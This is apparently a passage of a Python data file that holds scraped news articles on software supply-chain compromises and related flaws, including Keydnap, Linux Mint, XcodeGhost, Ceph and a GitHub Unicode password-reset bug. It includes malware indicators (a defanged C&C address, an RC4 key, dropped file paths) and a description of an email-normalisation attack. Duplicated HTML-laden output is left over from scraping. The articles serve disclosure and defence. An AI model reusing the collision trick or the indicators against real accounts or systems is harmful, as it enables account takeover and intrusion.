Mac users are highly advised not to download software and apps from third-party sites and avoid using unnecessary apps. Remember, Former National Security Agency (NSA) chief Michael Hayden and his wife were in an Apple store in Virginia, Hayden said at a conference that salesman approached and raved about the iPhone, saying that there were already “400,000 apps” for the device. Hayden, amused, turned to his wife and quietly asked: “This kid doesn’t know who I am, does he? Four-hundred-thousand apps mean 400,000 possibilities for attacks."""
article51 = "Published on None. From combining emoji marks and astral planes, Unicode is under appreciated and poorly understood. The importance of understanding Unicode extends beyond localization and diversity. Failing to understand Unicode may lead to vulnerabilities in your code.One lesser known occurrence is Unicode Case Mapping Collisions. Loosely speaking, a collision occurs when two different characters are uppercased or lowercased into the same character. This effect is found commonly at the boundary between two different protocols, like email and domain names.A quick example ß  . toLowerCase () // ss  ß  . toLowerCase () ===  SS  . toLowerCase () // true // Note the Turkish dotless i  John@Gıthub.com  . toLowerCase () ===  John@Github.com  . toLowerCase ()Transformation CollisionsWhile there are many Unicode case collisions across all the Unicode astral planes, Well only include the characters that collide into the English alphabet. This Unicode guide includes an exhaustive list of collisions.UppercaseChar Code Point Output Char ß 0x00DF SS ı 0x0131 I ſ 0x017F S ﬀ 0xFB00 FF ﬁ 0xFB01 FI ﬂ 0xFB02 FL ﬃ 0xFB03 FFI ﬄ 0xFB04 FFL ﬅ 0xFB05 ST ﬆ 0xFB06 STLowercaseChar Code Point Output Char K 0x212A kCase StudyCompany: GitHubVulnerability: Password reset emails delıvered to the wrong address.Cause: Forgot password emails validated against lowercase value on file, but sent the provided email.GitHubs forgot password feature could be compromised because the system lowercased the provided email address and compared it to the email address stored in the user database. If there was a match, GitHub would send the reset password link to the email address provided by the attacker- which was technically speaking, not the same email address. Ill let the GitHub Security team explain further.One Quick Note: Though not strictly required, using punycode conversion from John@Gıthub.com to xn--john@gthub-2ub.com would have helped prevent this issue. Its doubtful any web apps do this as part of the user registration process.John discovered a flaw in the way email addresses were being normalized to standard character sets when used to look up accounts during the password recovery flow. Password reset tokens are associated with email addresses and initiating a password reset with an email address that normalizes to another email address would result in the reset token for one user being delivered to the email address of another account. The attack only works if an email provider allows Unicode in the local part of the email address and an attacker can claim an email address containing Unicode that would improperly normalize to the email address of another account (e.g. mike@example.org vs mıke@example.org ). Unicode in the domain part is not allowed by GitHubs outgoing mail server and therefore cannot be used as part of a broader attack on common domains (e.g. gmail.com vs gmaıl.com). GitHub addressed the vulnerability by making sure the email address in the database matches the email address that initiated the reset flow. This ensures that the email address used to generate the token matches the email address to which the reset token gets delivered. GitHub Security TeamThis particular fix is simple - only send out the original email address that was used to create the account.More UnicodeHave we convinced you that Unicode is Awesome? Checkout our verbose guide to Awesome Unicode, which made it to the front page of HackerNews.Follow on GithubYou can follow John Gracey on Github at github.com/jagracey— or view other articles including:"
article52 = "Published on 2016-08-30 00:00:00. During the last hours, OSX/Keydnap was distributed on a trusted website, which turned out to be something else. It spread via a recompiled version of the otherwise legitimate open source BitTorrent client application Transmission and distributed on their official website.Last month ESET researchers wrote an article about a new OS X malware called OSX/Keydnap, built to steal the content of OS Xs keychain and maintain a permanent backdoor. At that time of the analysis, it was unclear how victims were exposed to OSX/Keydnap. To quote the original article: It could be through attachments in spam messages, downloads from untrusted websites or something else.During the last hours, OSX/Keydnap was distributed on a trusted website, which turned out to be something else. It spread via a recompiled version of the otherwise legitimate open source BitTorrent client application Transmission and distributed on their official website.Instant response from the Transmission teamLiterally minutes after being notified by ESET, the Transmission team removed the malicious file from their web server and launched an investigation to identify how this happened. At the time of writing, it was impossible to tell exactly when the malicious file was made available for download. According to the signature, the application bundle was signed on August 28th, 2016, but it seems to have been distributed only the next day. Thus, we advise anyone who downloaded Transmission v2.92 between August 28th and August 29th, 2016, inclusively, to verify if their system is compromised by testing the presence of any of the following file or directory:/Applications/Transmission.app/Contents/Resources/License.rtf/Volumes/Transmission/Transmission.app/Contents/Resources/License.rtf$HOME/Library/Application Support/com.apple.iCloud.sync.daemon/icloudsyncd$HOME/Library/Application Support/com.apple.iCloud.sync.daemon/process.id$HOME/Library/LaunchAgents/com.apple.iCloud.sync.daemon.plist/Library/Application Support/com.apple.iCloud.sync.daemon/$HOME/Library/LaunchAgents/com.geticloud.icloud.photo.plistIf any of them exists, it means the malicious Transmission application was executed and that Keydnap is most likely running. Also note that the malicious disk image was named Transmission2.92.dmg while the legitimate one is Transmission-2.92.dmg (notice the hyphen).Similarity with KeRangerIf this modus operandi sounds familiar, you are totally correct. In March 2016, Palo Alto Networks published a blog post warning about the first OS X ransomware observed. In fact, Keydnap used the same technique to spread itself.In both cases, a malicious block of code is added to the main function of the Transmission application. The code responsible for dropping and running the malicious payload is astonishingly the same.Just like in the KeRanger case, a legitimate code signing key was used to sign the malicious Transmission application bundle. Its different from the legitimate Transmission certificate, but is still signed by Apple and bypasses Gatekeeper protection.# Malicious Transmission.app $ codesign -dvvv /Volumes/Transmission/Transmission.app Executable=/Volumes/Transmission/Transmission.app/Contents/MacOS/Transmission Identifier=org.m0k.transmission Format=app bundle with Mach-O thin (x86_64) CodeDirectory v=20200 size=6304 flags=0x0(none) hashes=308+3 location=embedded Hash type=sha1 size=20 CandidateCDHash sha1=37ffe70260919ee70e9f2a601d5ad00e2dd5a011 Hash choices=sha1 CDHash=37ffe70260919ee70e9f2a601d5ad00e2dd5a011 Signature size=4255 Authority=Developer ID Application: <strong>Shaderkin Igor (836QJ8VMCQ)</strong> Authority=Developer ID Certification Authority Authority=Apple Root CA Signed Time=Aug 28, 2016, 12:09:55 PM Info.plist entries=38 TeamIdentifier=<strong>836QJ8VMCQ</strong> Sealed Resources version=2 rules=12 files=331 Internal requirements count=1 size=212 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # Malicious Transmission.app $ codesign - dvvv / Volumes / Transmission / Transmission . app Executable = / Volumes / Transmission / Transmission . app / Contents / MacOS / Transmission Identifier = org . m0k . transmission Format = app bundle with Mach - O thin ( x86_64 ) CodeDirectory v = 20200 size = 6304 flags = 0x0 ( none ) hashes = 308 + 3 location = embedded Hash type = sha1 size = 20 CandidateCDHash sha1 = 37ffe70260919ee70e9f2a601d5ad00e2dd5a011 Hash choices = sha1 CDHash = 37ffe70260919ee70e9f2a601d5ad00e2dd5a011 Signature size = 4255 Authority = Developer ID Application : < strong > Shaderkin Igor ( 836QJ8VMCQ ) < / strong > Authority = Developer ID Certification Authority Authority = Apple Root CA Signed Time = Aug 28 , 2016 , 12 : 09 : 55 PM Info . plist entries = 38 TeamIdentifier = < strong > 836QJ8VMCQ < / strong > Sealed Resources version = 2 rules = 12 files = 331 Internal requirements count = 1 size = 212<span style=font-weight: 400; data-mce-style=font-weight: 400;># Clean Transmission.app</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>$ codesign -dvvv /Volumes/Transmission/Transmission.app</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Executable=/Volumes/Transmission/Transmission.app/Contents/MacOS/Transmission</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Identifier=org.m0k.transmission</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Format=app bundle with Mach-O thin (x86_64)</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>CodeDirectory v=20200 size=6304 flags=0x0(none) hashes=308+3 location=embedded</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Hash type=sha1 size=20</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>CandidateCDHash sha1=a68d09161742573b09a17b8aef05f918a1cebcac</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Hash choices=sha1</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>CDHash=a68d09161742573b09a17b8aef05f918a1cebcac</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Signature size=8561</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Authority=Developer ID Application: </span><b>Digital Ignition LLC</b> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Authority=Developer ID Certification Authority</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Authority=Apple Root CA</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Timestamp=Mar 6, 2016, 3:01:41 PM</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Info.plist entries=38</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>TeamIdentifier=</span><b>5DPYRBHEAR</b> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Sealed Resources version=2 rules=12 files=328</span> <span style=font-weight: 400; data-mce-style=font-weight: 400;>Internal requirements count=1 size=180</span> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 < span style = font-weight: 400; data - mce - style = font-weight: 400; > # Clean Transmission.app</span> < span style = font-weight: 400; data - mce - style = font-weight: 400; > $ codesign - dvvv / Volumes / Transmission / Transmission . app < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Executable = / Volumes / Transmission / Transmission . app / Contents / MacOS / Transmission < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Identifier = org . m0k . transmission < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Format = app bundle with Mach - O thin ( x86_64 ) < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > CodeDirectory v = 20200 size = 6304 flags = 0x0 ( none ) hashes = 308 + 3 location = embedded < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Hash type = sha1 size = 20 < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > CandidateCDHash sha1 = a68d09161742573b09a17b8aef05f918a1cebcac < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Hash choices = sha1 < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > CDHash = a68d09161742573b09a17b8aef05f918a1cebcac < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Signature size = 8561 < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Authority = Developer ID Application : < / span > < b > Digital Ignition LLC < / b > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Authority = Developer ID Certification Authority < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Authority = Apple Root CA < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Timestamp = Mar 6 , 2016 , 3 : 01 : 41 PM < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Info . plist entries = 38 < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > TeamIdentifier = < / span > < b > 5DPYRBHEAR < / b > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Sealed Resources version = 2 rules = 12 files = 328 < / span > < span style = font-weight: 400; data - mce - style = font-weight: 400; > Internal requirements count = 1 size = 180 < / span >ESET has notified Apple about compromised code signing key.Beside the distribution method, Keydnap and KeRanger features some similarity in its code such as the C&C URL resource path and parameter.KeRanger: /osx/ping?user_id=%s&uuid=%s&model=%sKeydnap: /api/osx?bot_id=%s&action=ping&data=%s (parameters as POST data, encrypted with RC4)Keydnap now at version 1.5While reporting to the C&C server, Keydnap included an internal version. The one we observed in the new binary is 1.5.It is still packed with the modified UPX described in our first article about Keydnap. The patch we published on Github to unpack the executable file still works with the new variant.A significant change in the new version is the presence of a standalone Tor client. This enables Keydnap to reach its onion-routed C&C server without the need of a Tor2Web relay such as onion.to.There is only one additional command compared to the previous version we analyzed. This new command, with id 10, allows the C&C server to be set to a different URL and saves it on the disk.The RC4 key used to encrypt HTTP POST data and decrypt the response changed to u-4&LpZ!6Kgu^=$a.The hardcoded C&C URL is now hxxp://t4f2cocitdpqa7tv.onion/api/osxHow to remove OSX/KeydnapTo remove Keydnap v1.5, start by quitting Transmission. Then, in Activity Monitor, kill processes with any of the following names:– icloudproc– License.rtf– icloudsyncd– /usr/libexec/icloudsyncd -launchd netlogon.bundleRemove the following files and directories:– /Library/Application Support/com.apple.iCloud.sync.daemon/– /Library/LaunchAgents/com.apple.iCloud.sync.daemon.plist– /Users/$USER/Library/Application Support/com.apple.iCloud.sync.daemon/– /Users/$USER/Library/Application Support/com.geticloud/– /Users/$USER/Library/LaunchAgents/com.apple.iCloud.sync.daemon.plist– /Users/$USER/Library/LaunchAgents/com.geticloud.icloud.photo.plistRemove Transmission from your system and redownload it from a trusted source. The Transmission website and binaries are now hosted on Github. You can verify the hash and the signature of the legitimate binary package with:– shasum -a 256 and compare with the one on the site and– codesign -dvvv and verify if is signed by Digital Ignition LLC with team identifier 5DPYRBHEAR.IOCsTransmission bundleSHA-1 Filename ESET Detection name 1ce125d76f77485636ecea330acb038701ccc4ce Transmission2.92.dmg OSX/Keydnap.AOSX/Keydnap dropperSHA-1 Filename ESET Detection name e0ef6a5216748737f5a3c8d08bbdf204d039559e Transmission OSX/TrojanDropper.Agent.AOSX/Keydnap backdoorSHA-1 ESET Detection name C&C Version 8ca03122ee73d3e522221832872b9ed0c9869ac4 OSX/Keydnap.A hxxp://t4f2cocitdpqa7tv.onion 1.5Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center Submit"
article53 = "Published on 2016-08-04 00:00:00. Classic Shell and Audacity downloads were booby-trapped this week with an old-school software nasty that knackered victims Windows PCs.Hackers were able to inject some retro-malware into the popular applications installers hosted on fosshub.com, an official home for Classic Shell and Audacity releases among other software projects.When victims fetched the tainted downloads on Tuesday and ran them, rather than install the expected app, the computers Master Boot Record (MBR) was replaced with code that, during the next reboot or power on, displayed a cheeky message and prevented the machine from starting up properly. The main drives partition table was also likely damaged.We thought these sorts of shenanigans died in the 1980s or early 1990s. In order for this to work, the victim would have to click through a warning that the download was not legit.The message shown after a reboot read:As you reboot, you find that something has overwritten your MBR! It is a sad thing your adventures have ended here! Direct all hate to Pegglecrew (@cultofrazer on Twitter)Cult of Razer hasnt anything to share on Twitter – Peggle Crew is, were told, actually over here on the social network.Classic Shell is a free and popular application that brings a Windows 7-style start menu back to later Windows editions. Audacity is open-source and described as a free multi-track audio editor and recorder.For some computers, the MBR overwrite worked as Peggle Crew expected with a message displayed. For other systems, bewildered victims were simply dumped at a BIOS configuration screen or a blank screen with a flashing cursor during the next reboot. The broken MBR is repairable, especially if you have a Windows recovery disc to hand, and youll need TestDisk to restore a trashed partition table.Less tech-savvy folks may end up wiping their computers and starting from scratch out of frustration. You might want to blow it away anyway and restore from a good backup in case the software nasty left any other surprises on the drive.After I Installed the Windows 10 anniversary update I noticed it had uninstalled Classic Shell and had an even worse start menu as before, said peterb on the Classic Shell forums.So I went to the site, checked if the latest version 4.3 supported the update and downloaded it. When I installed it said it couldnt be trusted, I installed anyway but it did nothing. When I restarted my laptop it went straight to BIOS. Luckily I had a System Repair Disc close by and I could fix Windows.If your screen looks like this, youre in trouble ... Source: ClassicShell.net forumsFossHub tries to be a spyware-less and adware-free host for free and open-source software. According to the sites administrator on Wednesday, a group of hackers gained control of two user accounts that had access to the Classic Shell and Audacity downloads:The attackers uploaded a malware file on Classic Shell page which was downloaded approximately 300 times. We removed the file in several minutes and we changed all passwords for all services we had. They were greedy meaning that they targeted the largest projects listed on FossHub: Audacity and Classic Shell. We reacted promptly for Audacity installer but for Classic Shell, several hundred users were able to download the malware infected version. Several hours later, we noticed the attackers were able to gain access through an FTP account and we decided to shut down the main server immediately to prevent any further infection/damage. We are currently in the process of reinstalling everything, change all access rights, passwords and run up under new security rules. I would like to say that we apologize but I would lie not to admit it is the worst day ever for me (personally) and all FossHub team members.The software nasty has since been submitted to Virustotal.Classic Shell developer Ivo Beltchev is advising anyone unsure of their downloads to check for the security certificate: the authentic version will show Beltchev as a verified publisher, while the malicious build will show up in Windows as coming from an unknown publisher.Shots of an authentic (left) and malicious (right) installer notificationTeam Audacity, meanwhile, said: For about 3 hours on August 2, 2016, our download server was serving a hacked copy of Audacity that contained malware. This was due to hackers obtaining the password of one of our developers and using it to upload the malware.We are a community of developers, documentation writers, support and help people, not a commercial outfit with a dedicated security team with strong security protocols.We did not have the right safeguards in place, namely, to monitor external files. We clearly have not been vigilant enough. Over the next few weeks we will be working to become a safer, more secure organization. ®"
article54 = "Published on None. A hacker has broken into the website of one of the most-popular Linux version and pointed users to malicious download links that contained a modified version of the software.(Image: LinuxMint.com)The surprise announcement was made Saturday, shortly after the breach was detected.In a blog post, Clement Lefebvre, head of the Linux Mint project -- said to be the third most-popular version of the open-source operating system after Ubuntu and Fedora -- confirmed the breach.Hackers made a modified Linux Mint ISO, with a backdoor in it, and managed to hack our website to point to it, he said.As far as we know, the only compromised edition was Linux Mint 17.3 Cinnamon edition, he added. If you downloaded another release or another edition, this does not affect you. If you downloaded via torrents or via a direct HTTP link, this doesnt affect you either.Lefebvre said only downloads from Saturday were compromised.Shortly after the announcement, the projects website was pulled offline.Lefebvre said the hacked download image files -- used to install the Linux operating system -- were hosted on a server based in Bulgaria. Micah Lee, security engineer and reporter at The Intercept, posted on his blog with more details, saying that the hacker loaded the Tsunami botnet malware on the disk image. Tsunami allows an attacker remote access to an infected machine.Lefebvre said in this case the backdoor connects to absentvodka.com, which at the time of writing does not appear to be online.Its thought the Linux distros website and forum was stolen in the breach.CSOs Steve Ragan found an ad on a dark web site claiming to have a full forum dump of the site, with a going rate of about 0.197 bitcoin, or about $85 per download. (We were able to verify the listing exists, but could not speak to its authenticity.)A screenshot of the alleged dark-web listing. (Image: ZDNet/CBS Interactive)Lefebvre confirmed the site was hacked through its outdated WordPress installation, but he denied that using HTTPS site encryption would have mitigated the attack.Youd be served the exact same hacked information via HTTPS, he said.Lee also criticized the sites lack of encryption, arguing that the checksums on the site could easily be modified by an attacker to trick the user into downloading a verified build.If a hacker can hack the website to modify the download link, they can modify the checksum at the same time to match their malicious download, he said.Verifying is PGP signatures is more complicated and harder to explain than comparing checksums, but its actually secure. Its the only way to be sure that a Linux installer ISO you download hasnt been tampered with since the image was built by the developers, he added."
article55 = "" 
article56 = "Published on 2015-09-21 00:00:00. Apple is cleaning up its official iOS App Store after the first large-scale attack on its walled garden mobile software site.The Xcode development tools used by iOS app makers was copied, modified, and distributed online, by hackers to inject malicious code into apps available on the App Store, as previously reported.Palo Alto Networks warned that the malware had infected more than 39 iOS apps – including messaging app WeChat – affecting hundreds of millions of users.The XcodeGhost attack created a means for hackers to phish passwords and open URLs though the infected apps. One of the main aims was stealing iCloud logins.Apps affected by the so-called XcodeGhost attack included some of the most popular apps in China, like the ride-hailing app Didi Kuaidi.Meanwhile, Chinese internet security firm Qihoo 360 claimed it had already found almost 350 infected apps.The fake developer code was posted by untrusted sources, according to Apple, which said it was all over the problem.Weve removed the apps from the App Store that we know have been created with this counterfeit software, an Apple spokeswoman told Fox Business in an email. We are working with the developers to make sure theyre using the proper version of Xcode to rebuild their apps.Tencent, developers of the WeChat app, is also playing down the security flap: A preliminary investigation into the flaw has revealed that there has been no theft and leakage of users information or money, but the WeChat team will continue to closely monitor the situation, it said in a blog post.Apple is known to be very strict with its application validation process and this has helped to keep iPhone and iPad users largely (but not completely) unaffected by malware.John Smith, principal solutions architect at application security firm Veracode, said that the whole incident shook the comforting notion that iOS is safer than Android, which has had a malware and vulnerability problem for years.In recent years it has seemed that the problem of Mobile Malware was bigger for Android than for iOS, Smith said. The more rigorous testing regime required before an iOS app can be published has always been considered to be the reason for this difference, but in this case it seems to have fallen short. One very interesting aspect of this incident is that the developers of the apps had no knowledge that their own code was being used to carry malware – it was the modified development environment (Xcode) that introduced the payload.Code for XCodeGhost has been published on Github. A quick analysis by the Internet Storm Centre provides pointers on how to identify poisoned apps. ®" 
article57 = "Published on None. Red Hat had a really unpleasant surprise last week. Its Ceph community site, which hosts development for the open-source Ceph distributed object store, and the Inktank download site, the commercial side of Ceph, had both been hacked.What happened? Was the code corrupted? We still dont know. Red Hat reports, While the investigation into the intrusion is ongoing , our initial focus was on the integrity of the software and distribution channel for both sites.The good news is To date, our investigation has not discovered any compromised code available for download on these sites. The bad news is that Red Hat can not fully rule out the possibility that some compromised code was available for download at some point in the past.Putting salt into this storage software wound, this crack has opened the door not just to Red Hats CentOS Ceph, but to Ubuntu Linuxs Ceph as well. Both rely on the code from download.inktank.com. The CentOS and Ubuntu versions were signed with an Inktank signing key (id 5438C7019DCEEEAD). In addition, ceph.com provided the upstream packages for the Ceph community versions signed with a Ceph signing key (id 7EBFDD5D17ED316D).Red Hat security states that they no longer trust the integrity of the Inktank signing key, and therefore have re-signed these versions of the Red Hat Ceph Storage products with the standard Red Hat release key. Customers of Red Hat Ceph Storage products should only use versions signed by the Red Hat release key.This intrusion did not affect other Ceph sites such as download.ceph.com or git.ceph.com. Its also not known to have affected any other Ceph community infrastructure. There is no evidence that build systems or the Ceph github source repository were compromised.According to Ceph, New hosts for ceph.com and download.ceph.com have been created and the sites have been rebuilt. All content available on download.ceph.com has been verified, and all ceph.com URLs for package locations now redirect there. There is still some content missing from download.ceph.com that will appear later today: source tarballs will be regenerated from git, and older release packages are being resigned with the new release key.Red Hat Ceph Storage on Red Hat Enterprise Linux (RHEL) are not affected by this issue. Other Red Hat products were also unscathed.Mark Shuttleworth, Canonical and Ubuntu founder, added, For clarity, if you are using Ceph from the Ubuntu repositories then you are not affected at all.Use the following instructions to download, verify, and install the known clean versions of Ceph.Replace APT keys (Debian, Ubuntu)sudo apt-key del 17ED316Dcurl https://git.ceph.com/release.asc | sudo apt-key add -sudo apt-get updateReplace RPM keys (Fedora, CentOS, SUSE, etc.)sudo rpm -e --allmatches gpg-pubkey-17ed316d-4fb96ee8sudo rpm --import https://git.ceph.com/release.ascReinstalling packages (Fedora, CentOS, SUSE, etc.)sudo yum clean metadatasudo yum reinstall -y $(repoquery --disablerepo=* --enablerepo=ceph --queryformat=%{NAME} list *)For a blessing, Customer data was not stored on the compromised system. The system did have usernames and hashes of the fixed passwords we supplied to customers to authenticate downloads.Red Hat isnt sure how this crack happened. On the other hand, the hacked sites were hosted on a computer system outside of Red Hat infrastructure. The rebuilt sites are now safely within Red Hats corporate confines.Related Stories:"
article58 = "Published on None. Cloud-based code-hosting service Code Spaces announced today it was going out of business after a hacker deleted most of its machines, customer data and backups.Code Spaces, a code-hosting and software collaboration platform, has been put out of business by an attacker who deleted the companys data and backups.Officials wrote a lengthy explanation and apology on the companys website, promising to spend its current resources helping customers recover whatever data may be left.Code Spaces will not be able to operate beyond this point, the cost of resolving this issue to date and the expected cost of refunding customers who have been left without the service they paid for will put Code Spaces in an irreversible position both financially and in terms of ongoing credibility, read the note. As such at this point in time we have no alternative but to cease trading and concentrate on supporting our affected customers in exporting any remaining data they have left with us.The beginning of the end was a DDoS attack initiated yesterday that was accompanied by an intrusion into Code Spaces Amazon EC2 control panel. Extortion demands were left for Code Spaces officials, along with a Hotmail address they were supposed to use to contact the attackers.Upon realization that somebody had access to our control panel, we started to investigate how access had been gained and what access that person had to the data in our systems, Code Spaces said. It became clear that so far no machine access had been achieved due to the intruder not having our private keys.Code Spaces said it changed its EC2 passwords, but quickly discovered the attacker had created backup logins, and once recovery attempts were noticed, the attacker began deleting artifacts from the panel.We finally managed to get our panel access back, but not before he had removed all EBS snapshots, S3 buckets, all AMIs, some EBS instances and several machine instances, Code Spaces said. In summary, most of our data, backups, machine configurations and offsite backups were either partially or completely deleted.In summary, most of our data, backups, machine configurations and offsite backups were either partially or completely deleted.Amazon Web Services customers are responsible for credential management. Amazon, however, has built-in support for two-factor authentication that can be used with AWS accounts and accounts managed by the AWS Identity and Access Management tool. AWS IAM enables control over user access, including individual credentials, role separation and least privilege.Within 12 hours, Code Spaces went from a viable business to devastation. The company reported that all of its svn repositories—backups and snapshots—were deleted. All EBS volumes containing database files were also deleted. A few old svn nodes and one git node were left untouched, the company said.A cache of Code Spaces services includes promises of full redundancy and that code is duplicated and distributed among data centers on three continents.Backing up data is one thing, but it is meaningless without a recovery plan, not only that a recovery plan – and one that is well-practiced and proven to work time and time again, Code Spaces said. Code Spaces has a full recovery plan that has been proven to work and is, in fact, practiced." 
article59 = ""
article60 = "Published on None. Apt vulnerability sparks Debian security discussionBenefits for LWN subscribers The primary benefit from subscribing to LWN is helping to keep us publishing, but, beyond that, subscribers get immediate access to all site content and access to a number of extra site features. Please sign up today!Downloading packages from a distributions repositories is generally considered to be a safe operation—packages are (or at least should be) signed and those signatures are verified before installation. Debians Apt package manager has used cryptographic signatures to verify the authenticity of packages for more than ten years. So it was a rather large surprise to see a late May report that Apt doesnt require valid signatures for source packages.Jakub Wilk found the bug when testing repositories with packages that didnt have any signatures. By using a proxy that returned 404 not found errors for any requests targeting Release.gpg or InRelease files (which hold the signatures), he found that installing or downloading binary packages failed (as expected). But he also found that downloading or unpacking a source package worked, as did building a binary package from the downloaded source package. That is clearly a flaw that a man in the middle (MITM) could exploit to put compromised source files onto Debian systems.It is a difficult vulnerability to exploit, perhaps, and would require user assistance (i.e. building the package) to activate a malicious payload, but it certainly runs afoul of reasonable expectations. One can also imagine targeted attacks using the vulnerability that could be far more destructive. Worse yet, though, is that the normal methods for rebuilding the Debian archive (e.g. for a new architecture) would not detect this kind of tampering, as Thorsten Glaser pointed out. Those methods assume that apt-get source pkg always verifies the signature.The problem in Apt was fixed quickly. The function that handles source packages simply needed to call the IsTrusted() method to verify the signature. In addition, a test case was added to catch this if the bug ever reappears. The bug was then closed by Michael Vogt on June 10, only to be reopened by Christoph Anton Mitterer two days later.Although there was mention of contacting the security team in the bug, that evidently never happened. So one of the reasons that Mitterer reopened the issue was to ensure that a CVE got assigned and that a Debian Security Advisory (DSA) was issued. As he put it:  So IMHO this bug definitely deserves a CVE and a DSA,... so that people are informed that [their] systems might have been compromised (i.e. if an attacker tricked them into using forged sources) . A CVE was duly assigned (CVE-2014-0478) and DSA-2958-1 was issued.But there are a number of larger issues here. Mitterer outlines some of them in his lengthy bug-reopening message. He is concerned that various pieces of Debian infrastructure are insufficiently secure against (mostly) MITM attacks. For example, Apt will work with unsigned repositories, which is seen as a feature by some. As David Kalnischkies said:  The problem; is that apt supports unsigned repositories as too many people would bitch too much if it would require a signature – it used to work before apt 0.6, it has to work forever, man – FOR EVER!  Glasers description of the potential MITM problems with sbuild and cowbuilder also factor in. Beyond those, Mitterer wondered about the security verification in packages that download code from elsewhere (e.g. Tor browser or Flash plugin) and other Debian tools that grab code to be built or to create new systems (e.g. debootstrap).But there is more to improving the security of Debian (or any project, for that matter) than just compiling lists of problem areas. As security team member Thijs Kinkhorst pointed out in a post to the debian-devel mailing list—where parts of the discussion moved—finding some piece of the problem to work on may be a better approach:You raise a lot of broad concerns under the header holes in secure apt which Im afraid does not [do] much to get us closer to a more secure Debian. Not many people will object that making Debian even more secure is a bad idea; it just needs concrete action, not a large list of potential areas to work on. I suggest that you focus on one of those aspects of your email and take some concrete action to get it addressed.Kalnischkies had a similar comment:What is really sad is that many people keep talking about how much more secure everything should be but dont do the smallest bit of work to make it happen or even do a basic level of research themselves. So instead of answering all your questions, I will instead leave them unanswered and say: Go on and check for yourself! You shouldnt trust a random guy like me anyway and if that leads to even one person contributing to apt (or the security team or anything else really) in this area, we have a phenomenal massive increase in manpower … (for apt in the 50% ballpark!)But there certainly is value in collecting up problem areas and trying to figure what the proper solution should be, Mitterer argued. Because many of the solutions would require fairly major changes to how things are done and what types of behavior are allowed—policy decisions, essentially—they are not things that Mitterer (or any single developer) can directly address without involving others.Its clear that there are some holes in Debians packaging infrastructure. Beyond the bug that Wilk just found, he also encountered a bug that was reported over a year ago regarding the hash checking done for source packages. It turns out that Apt only checks the MD5 hash, even if there are SHA1 or SHA256 hashes available for the package. That seems rather sloppy, even though it may be hard or impossible to exploit—as Kalnischkies put it:  If you happen to have a same-size preimage attack on MD5 I would be interested to hear about it. Mitterer is trying to raise the profile of these problems—with many lengthy replies throughout the bug and mailing list threads—but there is little evidence that much progress has been made. Some of the problems may be less dangerous or harder to exploit than Mitterer makes them out to be, but they add up to something that should be a bit worrisome. The inertia of a long-running project may be working against some kind of concerted effort to address the problems, as weve always done it that way can sometimes be a powerful, if potentially problematic, argument. It will be interesting to see what, if any, attention these problems get over time—it may require someone to drive the process with more than just ideas and words."
article61 = "Published on None. kernel.org status: hints on how to check your machine for intrusionFrom: Greg KH <greg-AT-kroah.com> To: Linux Kernel Mailing List <linux-kernel-AT-vger.kernel.org> Subject: kernel.org status: hints on how to check your machine for intrusion Date: Fri, 30 Sep 2011 16:59:24 -0700 Message-ID: <20110930235924.GA25176@kroah.com> Archive-link: Article, ThreadThe compromise of kernel.org and related machines has made it clear that some developers, at least, have had their systems penetrated. As we seek to secure our infrastructure, it is imperative that nobody falls victim to the belief that it cannot happen to them. We all need to check our systems for intrusions. Here are some helpful hints as proposed by a number of developers on how to check to see if your Linux machine might be infected with something: 0. One way to be sure that your system is not compromised is to simply do a clean install; we can all benefit from a new start sometimes. Before reinstalling any systems, though, consider following the steps below to learn if your system has been hit or not. 1. Install the chkrootkit package from your distro repository and see if it reports anything. If your distro doesnt have the chkroot package, download it from: http://www.chkrootkit.org/ Another tool is the ossec-rootcheck tool which can be found at: http://www.ossec.net/main/rootcheck And another one is the rkhunter program: http://www.rootkit.nl/projects/rootkit_hunter.html [Note, this tool has the tendancy to give false-positives on some Debian boxes, please read /usr/share/doc/rkhunter/README.Debian.gz if you run this on a Debian machine] 2. Verify that your package signatures match what your package manager thinks they are. To do this on a rpm-based system, run the following command: rpm --verify --all Please read the rpm man page for information on how to interpret the output of this command. To do this on a Debian based system, run the following bash snippet: dpkg -l \*|while read s n rest; do if [ $s == ii ]; then echo $n; fi; done > ~/tmp.txt for f in `cat ~/tmp.txt`; do debsums -s -a $f; done If you have a source-based system (Gentoo, LFS, etc.) you presumably know what you are doing already. 3. Verify that your packages are really signed with the distros keys. Heres a bash snippet that can do this on a rpm based system to verify that the packages are signed with any key, not necessarily your distros key. That exercise is left for the reader: for package in `rpm -qa`; do sig=`rpm -q --qf %{SIGPGP:pgpsig} $package` if [ -z $sig ] ; then # check if there 